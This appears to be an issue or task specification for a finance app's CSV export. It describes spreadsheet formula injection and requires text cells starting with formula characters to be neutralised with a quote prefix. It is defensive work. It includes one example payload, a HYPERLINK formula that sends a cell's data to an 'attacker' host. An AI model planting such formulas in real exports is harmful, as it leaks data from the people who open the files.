# CSV exports allow spreadsheet formula injection

Transactions can be exported to CSV (from the app, and through the command-line
client's `--format csv` output). Text fields such as payee, account, category and
tag names or notes are written verbatim. A user-controlled string that starts with
a formula character, e.g. a payee named `=HYPERLINK("http://attacker/?d="&B2,"x")`,
is evaluated as a formula when the CSV is opened in Excel, LibreOffice Calc or
Google Sheets.

## Required behaviour

- In every CSV produced by the transaction export (both the export of a given list
  of transactions and the export of a query), any **text** cell whose value starts
  with `=`, `+`, `-`, `@`, a tab character or a carriage return is written with a
  single quote `'` prepended (so the payee above is exported as
  `'=HYPERLINK(...)`). After CSV parsing, the cell value is exactly `'` followed by
  the original string.
- Text that does not start with one of these characters is unchanged
  (`Acme Corp` stays `Acme Corp`).
- **Numeric** values are never prefixed: a negative amount is still exported as a
  plain number (an amount of -25.00 is exported as `-25`).
- The header row and the set and order of columns are unchanged.
- Apply the same neutralisation to the CSV output of the command-line client
  (string cells starting with one of those characters get the `'` prefix; numbers
  do not). A cell containing a carriage return must also be quoted there, so it
  stays a single cell.
